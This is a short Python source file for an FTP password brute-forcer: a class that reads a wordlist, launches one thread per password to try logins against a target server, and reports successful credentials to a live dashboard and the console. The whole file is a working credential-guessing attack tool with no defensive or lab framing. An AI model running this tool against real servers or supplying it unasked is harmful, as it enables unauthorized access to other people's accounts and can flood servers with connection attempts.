from ftplib import FTP
import threading
from utils.dashboard import LiveDashboard

dashboard = LiveDashboard()

class FTPBruteForcer:
    def __init__(self, target, username, wordlist):
        self.target = target
        self.username = username
        self.wordlist = wordlist
        self.lock = threading.Lock()

    def try_login(self, password):
        dashboard.log_attempt()
        try:
            ftp = FTP(self.target)
            ftp.login(user=self.username, passwd=password)
            msg = f"{self.username}@{self.target} with password: {password}"
            dashboard.log_success(msg)
            with self.lock:
                print(f"[+] SUCCESS: {msg}")
            ftp.quit()
        except Exception as e:
            with self.lock:
                print(f"[-] Failed: {self.username}:{password} — {e}")

    def run(self):
        dashboard.start()
        with open(self.wordlist, 'r') as f:
            for line in f:
                password = line.strip()
                t = threading.Thread(target=self.try_login, args=(password,))
                t.start()
        dashboard.stop()
